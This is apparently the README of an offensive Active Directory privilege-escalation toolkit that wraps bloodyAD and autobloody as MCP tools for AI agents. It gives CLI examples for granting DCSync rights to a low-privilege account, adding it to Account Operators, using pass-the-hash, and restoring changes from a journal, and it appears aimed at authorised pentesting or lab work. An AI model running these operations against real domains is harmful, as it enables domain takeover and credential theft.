# adpwn-tools

BloodyAD + aclpwn AD privilege-escalation MCP toolkit.

---

## Directory layout (self-contained)

```
adpwn-tools/          ← clone / push this whole folder
├── adpwn/            ← vendored LDAP-primitive library (NEW – previously missing)
│   ├── __init__.py
│   ├── config.py     ← Identity, connect_ldap, AuthError
│   ├── primitives.py ← raw LDAP ACL operations (grant_full_control, grant_dcsync …)
│   ├── exploitation.py ← ExploitState / restore-journal writer
│   └── restore.py    ← RestoreOperation / RestoreException
├── tools/
│   ├── __init__.py
│   └── _async_runner.py  ← run_sync, launch, fetch helpers
├── adpwn_cli.py      ← standalone CLI (no MCP required)
├── adpwn_tools.py    ← async MCP tool functions
├── autobloody_tool.py ← subprocess wrapper for autobloody
├── bloodyad_tool.py  ← subprocess wrapper for bloodyAD
├── setup.py
├── requirements.txt
└── README.md
```

Everything is self-contained inside this repo — no sibling directories needed.

---

## Installation

```bash
pip install -e .           # installs adpwn package + entry point
pip install ldap3          # only hard runtime dependency
pip install bloodyAD       # for bloodyad_tool.py
pip install autobloody     # optional – for autobloody_tool.py
```

---

## CLI quick-start

```bash
# Grant DCSync to a low-priv user
python adpwn_cli.py dcsync \
    --host 10.10.11.100 --domain corp.local \
    --user svc-alfresco --password s3rvice \
    --trustee svc-alfresco

# Add member to a group
python adpwn_cli.py add-member \
    --host 10.10.11.100 --domain corp.local \
    --user svc-alfresco --password s3rvice \
    --group "Account Operators" --member svc-alfresco

# Undo all changes from a restore journal
python adpwn_cli.py restore \
    --host 10.10.11.100 --domain corp.local \
    --user svc-alfresco --password s3rvice \
    --file /tmp/adpwn-20261025-090000-abc12.restore
```

Pass-the-hash: use `--nthash <NTHASH>` (bare or `LM:NT`) instead of `--password`.
Note: PtH over pure LDAP (ldap3) has limitations; for full PtH coverage use
`bloodyad_tool.py` or `autobloody_tool.py` which invoke bloodyAD/autobloody
via subprocess.

---

## Restore journals

Every write operation produces a `.restore` JSON file in `/tmp/`.
The file records the before-state of each LDAP write (original SD bytes, original
group membership, etc.).  Running `adpwn_cli.py restore --file <path>` replays
every recorded change in reverse to return the environment to its original state.

`reset_password` operations are marked non-reversible (original password is
never stored); the restore step will warn and skip.

---

## Changes from original repo

| File | Change |
|------|--------|
| `adpwn/` | **Added** – entire package was missing |
| `tools/_async_runner.py` | **Added** – was missing |
| `adpwn_tools.py` | Fixed `_HERE`/`_PARENT` sys.path; renamed `target_group` → `target` |
| `adpwn_cli.py` | No functional changes (parameter was already `target`) |
| `autobloody_tool.py` | Unchanged |
| `bloodyad_tool.py` | Unchanged |
